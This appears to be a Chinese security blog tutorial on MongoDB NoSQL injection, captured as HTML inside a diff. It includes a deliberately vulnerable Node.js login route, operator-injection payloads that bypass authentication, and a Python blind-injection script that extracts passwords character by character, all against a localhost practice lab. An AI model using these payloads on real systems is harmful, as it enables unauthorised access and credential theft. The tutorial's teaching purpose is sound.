@@ -1,0 +1,300 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Nosql inject注入 | Zeo's Security Lab</title><meta name="author" content="Zeo"><meta name="copyright" content="Zeo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="0x00 Nosql inject最近主要在看那个 YApi 的注入漏洞，也是一个 mongodb的注入 所以来写一下这个东西，其实现在越来越常见的Nosql注入 感觉很多分布式和一些新的系统已经大量使用这种nosql数据库，这个注入和传统的关系型数据库有一点点不同 还有一个练习的靶场，等等放上来 github 0x01 What is nosql什么是 Nosql 都是抄的介绍自己看看吧 N">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nosql inject注入">
+<meta property="og:url" content="https://godzeo.github.io/2022/11/28/Nosql%20inject%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Zeo&#39;s Security Lab">
+<meta property="og:description" content="0x00 Nosql inject最近主要在看那个 YApi 的注入漏洞，也是一个 mongodb的注入 所以来写一下这个东西，其实现在越来越常见的Nosql注入 感觉很多分布式和一些新的系统已经大量使用这种nosql数据库，这个注入和传统的关系型数据库有一点点不同 还有一个练习的靶场，等等放上来 github 0x01 What is nosql什么是 Nosql 都是抄的介绍自己看看吧 N">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp">
+<meta property="article:published_time" content="2022-11-28T07:28:02.000Z">
+<meta property="article:modified_time" content="2023-01-26T13:02:06.257Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="nosql mongodb 数据库">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp"><link rel="shortcut icon" href="/img/WX20211124-162855.png"><link rel="canonical" href="https://godzeo.github.io/2022/11/28/Nosql%20inject%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Nosql inject注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-26 21:02:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Zeo's Security Lab" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">127</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Zeo's Security Lab</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Nosql inject注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-28T07:28:02.000Z" title="发表于 2022-11-28 15:28:02">2022-11-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-26T13:02:06.257Z" title="更新于 2023-01-26 21:02:06">2023-01-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><span id="more"></span>
+
+<h1 id="0x00-Nosql-inject"><a href="#0x00-Nosql-inject" class="headerlink" title="0x00 Nosql inject"></a>0x00 Nosql inject</h1><p>最近主要在看那个 YApi 的注入漏洞，也是一个 mongodb的注入</p>
+<p>所以来写一下这个东西，其实现在越来越常见的Nosql注入</p>
+<p>感觉很多分布式和一些新的系统已经大量使用这种nosql数据库，这个注入和传统的关系型数据库有一点点不同</p>
+<p>还有一个练习的靶场，等等放上来 github</p>
+<h1 id="0x01-What-is-nosql"><a href="#0x01-What-is-nosql" class="headerlink" title="0x01 What is nosql"></a>0x01 What is nosql</h1><h2 id="什么是-Nosql"><a href="#什么是-Nosql" class="headerlink" title="什么是 Nosql"></a>什么是 Nosql</h2><blockquote>
+<p>都是抄的介绍自己看看吧</p>
+<p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p>
+</blockquote>
+<h2 id="0x02-Nosql-注入的简介"><a href="#0x02-Nosql-注入的简介" class="headerlink" title="0x02 Nosql 注入的简介"></a>0x02 Nosql 注入的简介</h2><p>NoSQL 注入由于 NoSQL 本身的特性和传统的 SQL 注入有所区别。</p>
+<p>使用传统的SQL注入，攻击者利用不安全的用户输入来修改或替换应用程序发送到数据库引擎的 SQL 查询语句（或其他SQL语句）。<br>换句话说，SQL 注入使攻击者可以在数据库中 SQL 执行命令。</p>
+<p><strong>与关系数据库不同:</strong></p>
+<p>NoSQL 数据库不使用通用查询语言。NoSQL 查询语法是特定于产品的，查询是使用应用程序的编程语言编写的：PHP，JavaScript，Python，Java 等。这意味着成功的注入使攻击者不仅可以在数据库中执行命令，而且可以在应用程序本身中执行命令，这可能更加危险。</p>
+<h2 id="0x03-最常见的MongoDB"><a href="#0x03-最常见的MongoDB" class="headerlink" title="0x03 最常见的MongoDB"></a>0x03 最常见的MongoDB</h2><p>MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。</p>
+<h2 id="单词对标"><a href="#单词对标" class="headerlink" title="单词对标"></a>单词对标</h2><p>在 MongoDB 中基本的概念有一些特殊的名字“文档、集合、数据库”</p>
+<p>这个是先知文章之中看到的，感觉对比的非常好，一目了然，对于快速掌握还是比较友好</p>
+<p>表所示：</p>
+<table>
+<thead>
+<tr>
+<th>SQL 概念</th>
+<th>MongoDB 概念</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>database</td>
+<td>database</td>
+<td>数据库</td>
+</tr>
+<tr>
+<td>table</td>
+<td>collection</td>
+<td>数据库表&#x2F;集合</td>
+</tr>
+<tr>
+<td>row</td>
+<td>document</td>
+<td>数据记录行&#x2F;文档</td>
+</tr>
+<tr>
+<td>column</td>
+<td>field</td>
+<td>数据字段&#x2F;域</td>
+</tr>
+<tr>
+<td>index</td>
+<td>index</td>
+<td>索引</td>
+</tr>
+<tr>
+<td>table joins</td>
+<td></td>
+<td>表连接，MongoDB 不支持</td>
+</tr>
+<tr>
+<td>primary key</td>
+<td>primary key</td>
+<td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td>
+</tr>
+</tbody></table>
+<p>下表列出了关系型数据库 RDBMS 与 MongoDB 之间对应的术语：</p>
+<table>
+<thead>
+<tr>
+<th>RDBMS</th>
+<th>MongoDB</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数据库</td>
+<td>数据库</td>
+</tr>
+<tr>
+<td>表格</td>
+<td>集合</td>
+</tr>
+<tr>
+<td>行</td>
+<td>文档</td>
+</tr>
+<tr>
+<td>列</td>
+<td>字段</td>
+</tr>
+<tr>
+<td>表联合</td>
+<td>嵌入文档</td>
+</tr>
+<tr>
+<td>主键</td>
+<td>主键（MongoDB 提供了 key 为 _id）</td>
+</tr>
+</tbody></table>
+<h1 id="0x04-mongodb的简单使用"><a href="#0x04-mongodb的简单使用" class="headerlink" title="0x04 mongodb的简单使用"></a>0x04 mongodb的简单使用</h1><p>首先我们先熟悉一下mongodb的常规用法，回归基础哈哈</p>
+<p>下面是我学习的一些command line</p>
+<h3 id="利用账号密码登陆"><a href="#利用账号密码登陆" class="headerlink" title="利用账号密码登陆"></a>利用账号密码登陆</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># mongo mongodb://admin:admin@127.0.0.1:27017                                          </span><br><span class="line">MongoDB shell version v4.0.27</span><br><span class="line">connecting to: mongodb://127.0.0.1:27017/?gssapiServiceName=mongodb</span><br><span class="line">Implicit session: session &#123; &quot;id&quot; : UUID(&quot;e1c9a87d-f9e4-4cfc-b661-8d7019d19628&quot;) &#125;</span><br><span class="line">MongoDB server version: 4.0.27</span><br><span class="line">Server has startup warnings: </span><br><span class="line">2022-11-26T02:29:47.282+0000 I STORAGE  [initandlisten] </span><br><span class="line">2022-11-26T02:29:47.282+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine</span><br><span class="line">2022-11-26T02:29:47.282+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem</span><br><span class="line">---</span><br><span class="line">Enable MongoDB&#x27;s free cloud-based monitoring service, which will then receive and display</span><br><span class="line">metrics about your deployment (disk utilization, CPU, operation statistics, etc).</span><br><span class="line"></span><br><span class="line">The monitoring data will be available on a MongoDB website with a unique URL accessible to you</span><br><span class="line">and anyone you share the URL with. MongoDB may use this information to make product</span><br><span class="line">improvements and to suggest MongoDB products and deployment options to you.</span><br><span class="line"></span><br><span class="line">To enable free monitoring, run the following command: db.enableFreeMonitoring()</span><br><span class="line">To permanently disable this reminder, run the following command: db.disableFreeMonitoring()</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; show dbs</span><br><span class="line">admin   0.000GB</span><br><span class="line">arl     0.041GB</span><br><span class="line">config  0.000GB</span><br><span class="line">local   0.000GB</span><br></pre></td></tr></table></figure>
+
+<h3 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; db</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+
+<h3 id="切换数据库"><a href="#切换数据库" class="headerlink" title="切换数据库"></a>切换数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; use arl</span><br><span class="line">switched to db arl</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看集合-相当于看库表"><a href="#查看集合-相当于看库表" class="headerlink" title="查看集合(相当于看库表)"></a>查看集合(相当于看库表)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; show collections</span><br><span class="line">asset_domain</span><br><span class="line">asset_ip</span><br><span class="line">asset_site</span><br><span class="line">cert</span><br><span class="line">...</span><br><span class="line">&gt; show tables</span><br><span class="line">asset_domain</span><br><span class="line">asset_ip</span><br><span class="line">asset_site</span><br><span class="line">cert</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建一个集合"><a href="#创建一个集合" class="headerlink" title="创建一个集合"></a>创建一个集合</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.createCollection(&quot;zeotest&quot;)</span><br><span class="line">&#123; &quot;ok&quot; : 1 &#125;</span><br><span class="line">&gt; show tables</span><br><span class="line">all_users</span><br><span class="line">asset_domain</span><br><span class="line">asset_ip</span><br><span class="line">asset_site</span><br><span class="line">cert</span><br><span class="line">zeotest</span><br></pre></td></tr></table></figure>
+
+<h3 id="插入一个文档（数据）"><a href="#插入一个文档（数据）" class="headerlink" title="插入一个文档（数据）"></a>插入一个文档（数据）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db.zeotest.insert(&#123;name: &#x27;zeo&#x27;, </span><br><span class="line">    description: &#x27;the hacker&#x27;,</span><br><span class="line">    age: 18,</span><br><span class="line">    status: &#x27;UP&#x27;,</span><br><span class="line">    tel: [&#x27;13888888888&#x27;, &#x27;66666666666&#x27;]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询数据，带条件的查询"><a href="#查询数据，带条件的查询" class="headerlink" title="查询数据，带条件的查询"></a>查询数据，带条件的查询</h3><p>在 MongoDB 中使用 <code>find()</code> 方法来查询文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.zeotest.find()</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;63817c440c8866311e74ab59&quot;), &quot;name&quot; : &quot;zeo&quot;, &quot;description&quot; : &quot;the hacker&quot;, &quot;age&quot; : 18, &quot;status&quot; : &quot;UP&quot;, &quot;tel&quot; : [ &quot;13888888888&quot;, &quot;66666666666&quot; ] &#125;</span><br><span class="line">&gt; db.zeotest.insert(&#123;name: &#x27;jebson&#x27;,     description: &#x27;the it&#x27;,     age: 22,     status: &#x27;down&#x27;,     tel: [&#x27;138888&#x27;, &#x27;666666&#x27;] &#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; db.zeotest.find()</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;63817c440c8866311e74ab59&quot;), &quot;name&quot; : &quot;zeo&quot;, &quot;description&quot; : &quot;the hacker&quot;, &quot;age&quot; : 18, &quot;status&quot; : &quot;UP&quot;, &quot;tel&quot; : [ &quot;13888888888&quot;, &quot;66666666666&quot; ] &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;63817cb30c8866311e74ab5a&quot;), &quot;name&quot; : &quot;jebson&quot;, &quot;description&quot; : &quot;the it&quot;, &quot;age&quot; : 22, &quot;status&quot; : &quot;down&quot;, &quot;tel&quot; : [ &quot;138888&quot;, &quot;666666&quot; ] &#125;</span><br><span class="line">&gt; db.zeotest.find(&#123;&quot;name&quot;:&quot;zeo&quot;&#125;)</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;63817c440c8866311e74ab59&quot;), &quot;name&quot; : &quot;zeo&quot;, &quot;description&quot; : &quot;the hacker&quot;, &quot;age&quot; : 18, &quot;status&quot; : &quot;UP&quot;, &quot;tel&quot; : [ &quot;13888888888&quot;, &quot;66666666666&quot; ] &#125;</span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure>
+
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>有一个小bug，现在版本升级之后，得用下面这个，mongodb的包是包含在这个里面的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install mongoose</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05-NoSQL-注入"><a href="#0x05-NoSQL-注入" class="headerlink" title="0x05 NoSQL 注入"></a>0x05 NoSQL 注入</h1><h2 id="0x06-重言式注入"><a href="#0x06-重言式注入" class="headerlink" title="0x06 重言式注入"></a>0x06 <strong>重言式注入</strong></h2><p>也叫永真式，此类攻击是在条件语句中注入代码</p>
+<p>使生成的表达式判定结果永远为真，类似万能密码</p>
+<p>看一下下面这个简单的js代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#x27;/inject&#x27;, function(req, res) &#123;</span><br><span class="line">	var user = (req.query.user);</span><br><span class="line">	var pass = (req.query.pass);</span><br><span class="line">	var query = ( &#x27;&#123; &quot;name&quot;: &#x27;+user+&#x27;, &quot;passwd&quot;: &#x27;+pass+&#x27; &#125;&#x27; );</span><br><span class="line">	console.log(query)</span><br><span class="line">	const mydb = db.db(&#x27;arl&#x27;)</span><br><span class="line">	console.log(user,&quot;---&quot;,pass)</span><br><span class="line">	mydb.collection(mongo_col).findOne(&#123;</span><br><span class="line">		&quot;name&quot;: user, </span><br><span class="line">		&quot;passwd&quot;: pass</span><br><span class="line">	&#125;, function (err, user) &#123;</span><br><span class="line">		if (err) &#123;</span><br><span class="line">			return res.status(500).send(&#123;message: err.message&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		else if (!user) &#123;</span><br><span class="line">			res.render(&#x27;error&#x27;, &#123;error: &#x27;Sorry user not found!&#x27; &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">		    res.render(&#x27;result&#x27;, &#123;user: user.user, pass: user.pass &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/inject?user[$nin][]=&amp;pass[$ne]=</span><br></pre></td></tr></table></figure>
+
+<p>实际获取的数据</p>
+<p>user 是 <code>&#123; &#39;$nin&#39;: [ &#39;&#39; ] &#125;</code><br>pass 是 <code>&#123; &#39;$ne&#39;: &#39;&#39; &#125;</code></p>
+<p>拼接之后的qurey是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;name&quot;: [object Object], &quot;passwd&quot;: [object Object] &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解释一下：</strong></p>
+<ul>
+<li><p>首先是<code>$ne</code> 是 not equal 不等于</p>
+</li>
+<li><p>http链接中<code>user[$nin][]=&amp;pass[$ne]=</code></p>
+</li>
+<li><p>js中是 <code>query =array( &quot;user&quot; =&gt; array(&quot;$nin&quot; =&gt; 1),&quot;pass&quot; =&gt; (&quot;$ne&quot; =&gt; 1))</code></p>
+</li>
+<li><p>mongodb中拼接查询就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mydb.collection(mongo_col).find(&#123; &quot;name&quot;: &#123;&quot;$nin&quot;:1&#125;, &quot;passwd&quot;: &#123;&quot;$ne&quot;:1&#125; &#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这样就相当于是万能密码那 or 1&#x3D;1 吧， 查询就是永真的情况</p>
+</li>
+</ul>
+<h2 id="0x07-盲注"><a href="#0x07-盲注" class="headerlink" title="0x07 盲注"></a>0x07 盲注</h2><p>现在感觉很多的地方都是当页面没有回显这种情况</p>
+<p>一般都通过通过 <code>$regex</code> 正则表达式操作</p>
+<p>而且 NoSQL 用到的基本上都是布尔盲注。</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /inject?login=&amp;user[$eq]=zeo2&amp;pass[$regex]=.&#123;7&#125; HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line"></span><br><span class="line">错误，说明长度没有7</span><br><span class="line">GET /inject?login=&amp;user[$eq]=zeo2&amp;pass[$regex]=.&#123;6&#125; HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line"></span><br><span class="line">正确，说明长度为6</span><br></pre></td></tr></table></figure>
+
+<p>写给脚步跑一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">passwd = &#x27;&#x27;</span><br><span class="line">target = &#x27;http://127.0.0.1:8000/inject?login=&amp;user[$eq]=zeo2&amp;pass[$regex]=&#x27;</span><br><span class="line">while True:</span><br><span class="line">    for word in string.printable:</span><br><span class="line">        if word not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:</span><br><span class="line">            payload = &#x27;^%s&#x27; % (passwd + word)</span><br><span class="line">            r = requests.get(target + payload)</span><br><span class="line">            if &#x27;Welcome&#x27; in r.text:</span><br><span class="line">                print(&quot;Found one more char : %s&quot; % (passwd+word))</span><br><span class="line">                passwd += word</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2a27f2a363047ead9a5218340c288f5d.png" alt="image-20221126211214629"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://godzeo.github.io">Zeo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://godzeo.github.io/2022/11/28/Nosql%20inject%E6%B3%A8%E5%85%A5/">https://godzeo.github.io/2022/11/28/Nosql%20inject%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://godzeo.github.io" target="_blank">Zeo's Security Lab</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/nosql-mongodb-%E6%95%B0%E6%8D%AE%E5%BA%93/">nosql mongodb 数据库</a></div><div class="post_share"><div class="social-share" data-image="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp" 